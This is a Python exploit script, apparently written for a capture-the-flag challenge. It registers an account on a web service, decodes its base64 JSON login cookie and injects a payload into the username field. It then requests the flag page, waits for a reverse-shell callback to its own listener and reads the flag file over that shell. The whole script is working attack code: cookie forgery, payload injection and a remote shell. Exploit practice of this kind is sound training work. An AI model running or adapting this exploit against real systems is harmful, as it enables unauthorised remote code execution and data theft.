import json
import base64
import os
import poc
import requests
import socket
import sys
import time
from pwnlib.tubes import listen


def j(endpoint, path):
    if path[0] == '/' and endpoint[-1] == '/':
        return endpoint[:-1] + path
    return endpoint + path


def get_laddr(sess, endpoint):
    """Get local address connecting to endpoint."""
    resp = sess.get(endpoint, stream=True)
    sock = socket.fromfd(resp.raw.fileno(), socket.AF_INET, socket.SOCK_STREAM)
    return sock.getsockname()[0]


def register_user(sess, endpoint):
    """Register user, return username, password."""
    username = os.urandom(16).hex()
    resp = sess.post(j(endpoint, '/register'), data={'username': username})
    resp.raise_for_status()
    pwd = resp.text.split('password is: ')[1].split('.  Please record')[0]
    return username, pwd


def login_user(sess, endpoint, user, passwd):
    """Login user, return cookie."""
    resp = sess.post(j(endpoint, '/login'), data={
        'username': user, 'password': passwd})
    resp.raise_for_status()
    print(sess.cookies)
    return sess.cookies['logincookie']


def decode_cookie(value):
    raw = base64.b64decode(value)
    return json.loads(raw)


def encode_cookie(value):
    return base64.b64encode(json.dumps(value).encode()).decode()


def get_flag(sess, endpoint):
    try:
        resp = sess.get(j(endpoint, '/flag'), timeout=3)
    except requests.exceptions.Timeout:
        return None
    resp.raise_for_status()


def main(endpoint):
    rsock = listen.listen()
    print('Callback listening on %d' % rsock.lport)
    sys.stdout.flush()
    sess = requests.Session()
    laddr = get_laddr(sess, endpoint)
    print('laddr: ', laddr)
    sys.stdout.flush()
    print('Starting payload server')
    sys.stdout.flush()
    httpd, sendme = poc.payload(laddr, 18355, rsock.lport)
    time.sleep(1)
    print('Trying to register')
    sys.stdout.flush()
    username, password = register_user(sess, endpoint)
    cookie = login_user(sess, endpoint, username, password)
    dec = decode_cookie(cookie)
    print('Decoded cookie: %s' % dec)
    sys.stdout.flush()
    dec['username'] += '+' + sendme
    fixed_cookie = encode_cookie(dec)
    sess.cookies['logincookie'] = fixed_cookie
    print('Requesting flag page')
    sys.stdout.flush()
    get_flag(sess, endpoint)
    print('Requested flag, waiting for connection')
    sys.stdout.flush()
    rsock.wait_for_connection()
    print('Got connection')
    sys.stdout.flush()
    rsock.send('cat /home/ctf/flag.txt\n'.encode())
    rv = ''
    while '}' not in rv:
        rv = rsock.recv().decode()
        print(rv,end='')
    print('')
    httpd.shutdown()
    sys.exit(0)


if __name__ == '__main__':
    main(sys.argv[1])
